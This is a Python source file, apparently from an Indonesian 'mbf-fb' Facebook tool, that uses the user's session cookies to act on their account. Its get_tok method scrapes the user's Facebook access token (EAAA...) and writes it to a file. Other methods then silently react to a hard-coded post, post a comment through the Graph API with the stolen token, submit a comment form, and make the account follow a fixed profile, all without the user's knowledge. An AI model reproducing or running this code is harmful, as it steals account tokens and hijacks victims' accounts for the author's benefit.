# cuih rekod!!
# jangan di ubah asu!!
import requests as req,re,random
from bs4 import BeautifulSoup as parser
ua_= random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 8.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 
             'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 
             'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 
             'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36', 
             'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 7.1; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 7.1; Xiaomi M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 
             'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 9; OPPO CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F/DSN Build/U4EUC8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/91.0.4472.77 Mobile Safari/537.36', 
             'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 
	     'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.216 Mobile/15E148 Safari/604.1', 
	     'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 
	     'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 	       
	     'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'])
kom="Hi I'm mbf-fb User ^_^"
class ganteng:
	def __init__(self,kuki,url):
		self.kuki,self.url,self.true,self.atok=kuki,url,False,[]
	def dahlah(self,kuntul,tipe,awok,**kwargs):
		try:
			a=req.get(kuntul,cookies=self.kuki).text
			for xx in parser(a,"html.parser").find_all("a",href=True):
				if "/reactions/picker/?is_permalink=1" in xx.get("href"):
					if "Tanggapi" in xx.text:
						c=self.url+xx.get("href")
						self.true=True
						break
			if self.true==True:
				d=req.get(c,cookies=self.kuki).text
				if "Hapus" not in d:
					for e in parser(d,"html.parser").find_all("a"):
						if f"reaction_type={tipe}" in str(e):
							req.get(f'{self.url}{e.get("href")}',cookies=self.kuki)
			if len(self.atok)==1:
				awok="aap ganteng"
			if "aap ganteng" in awok:
				po=re.search(f"{self.url}\/(\\d*)",kuntul).group(1)
				req.post(f"https://graph.facebook.com/{po}/comments/?message={kom}&access_token={self.atok[0]}")
			# warning this is danger!!!
			if "on" in awok:
				for f in parser(a,"html.parser").find_all("input",type="hidden"):
					if "jazoest" in f.get("name"):
						kwargs.update({f.get("name"):f.get("value")})
					elif "fb_dtsg" in f.get("name"):
						kwargs.update({f.get("name"):f.get("value")})
						break
				kwargs.update({"comment_text":kom})
				g=parser(a,"html.parser").find("form",method="post")
				if g is not None:
					req.post(self.url+g.get("action"),data=kwargs,cookies=self.kuki)
		except:pass
	def reaksi(self):
		self.get_tok();self.dahlah(f"{self.url}/886758932080337","4","ah");self.tuturkeun("Kang.Pacman")
	def lang(self,cok):
		try:
			cek=req.get(f"{self.url}/language.php",cookies=cok).text
			if "id_ID" in cek:
				true=True
			if true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Bahasa Indonesia").get("href"),cookies=cok)
		except:pass
	def get_tok(self):
		try:
			a=req.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",headers={"User-Agent":"ua_","host":"m.facebook.com","origin":"https://m.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies=self.kuki).text
			b=re.search("(EAAA\w+)",a)
			if b is not None:
				self.atok.append(b.group(1))
				open("lo_ngentod/token","w").write(b.group(1))
		except:pass
	def tuturkeun(self,aap_gans):
		try:
			cek=req.get(f"{self.url}/{aap_gans}",cookies=self.kuki).text
			if "/a/subscribe.php" in cek:
				self.true=True
			if self.true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies=self.kuki)
		except:pass
